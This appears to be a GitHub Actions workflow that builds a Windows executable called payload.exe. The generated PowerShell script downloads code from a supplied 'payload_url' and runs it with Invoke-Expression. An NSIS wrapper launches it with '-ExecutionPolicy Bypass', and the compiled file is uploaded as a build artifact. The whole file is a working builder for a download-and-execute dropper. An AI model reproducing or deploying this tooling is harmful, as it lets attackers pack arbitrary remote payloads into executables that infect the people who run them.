name: Convert PowerShell to EXE using NSIS

on:
  workflow_dispatch:
    inputs:
      payload_url:
        description: 'URL to fetch PowerShell script'
        required: true
        type: string

jobs:
  build:
    runs-on: windows-latest

    steps:
    # Step 1: Checkout repository
    - name: Checkout Code
      uses: actions/checkout@v3

    # Step 2: Install NSIS
    - name: Install NSIS
      shell: powershell
      run: choco install nsis -y

    # Step 3: Save PowerShell Script with Dynamic URL Injection
    - name: Create PowerShell Script
      shell: powershell
      run: |
        $script = "function FetchScriptContent {
            param ([string]`$scriptUrl)
            try {
                `$response = Invoke-WebRequest -Uri `$scriptUrl -UseBasicParsing -TimeoutSec 10
                return `$response.Content
            } catch {
                Write-Host 'Error: Failed to fetch data from URL - `$scriptUrl'
                return `$null
            }
        }

        function ExecuteScript {
            param ([string]`$scriptContent)
            try {
                Invoke-Expression `$scriptContent
            } catch {
                Write-Host 'Error: Failed to execute PowerShell command.'
            }
        }

        `$scriptUrl = '${{ github.event.inputs.payload_url }}'

        if (`$scriptUrl) {
            `$scriptData = FetchScriptContent -scriptUrl `$scriptUrl
            if (`$scriptData) {
                ExecuteScript -scriptContent `$scriptData
            } else {
                Write-Host 'Error: No valid data received from the URL.'
            }
        } else {
            Write-Host 'Error: PAYLOAD_URL is not set.'
        }"
        Set-Content -Path "payload.ps1" -Value $script -Encoding UTF8

    # Step 4: Create NSIS Script for EXE Creation
    - name: Generate NSIS Script
      shell: powershell
      run: |
        $nsisScript = '!define APPNAME "PayloadScript"
        !define OUTPUT_FILE "payload.exe"

        Outfile "$PLUGINSDIR\payload.exe"

        Section "Main"
          InitPluginsDir
          File /oname=$PLUGINSDIR\payload.ps1 payload.ps1
          nsExec::Exec "powershell.exe -ExecutionPolicy Bypass -File $PLUGINSDIR\payload.ps1"
        SectionEnd'
        Set-Content -Path "script.nsi" -Value $nsisScript -Encoding UTF8

    # Step 5: Convert the PowerShell script to EXE using NSIS
    - name: Compile NSIS Script
      shell: powershell
      run: makensis script.nsi

    # Step 6: List the contents of the directory
    - name: List Directory Contents
      shell: powershell
      run: Get-ChildItem -Path .

    # Step 7: Upload the generated EXE as an artifact
    - name: Upload Executable
      uses: actions/upload-artifact@v4
      with:
        name: payload_exe
        path: payload.exe
